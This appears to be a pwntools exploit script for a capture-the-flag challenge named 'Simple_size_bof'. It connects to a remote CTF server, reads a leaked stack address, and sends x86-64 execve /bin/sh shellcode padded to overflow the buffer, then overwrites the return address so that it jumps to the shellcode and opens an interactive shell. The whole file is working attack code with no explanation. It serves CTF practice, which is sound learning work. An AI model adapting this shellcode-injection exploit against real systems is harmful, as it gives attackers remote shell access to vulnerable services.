from pwn import *

# p = process("./Simple_size_bof")
p = remote("ctf.j0n9hyun.xyz", 3005)
# 1. know stack addr

p.recvline()
data = p.recvline()[7:-1]
stack_addr = int(data, 16)

payload = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

payload += b"A"*(0x6D38-len(payload))
payload += p64(stack_addr)

p.sendline(payload)
# = p.send(payload + '\n')
p.interactive()
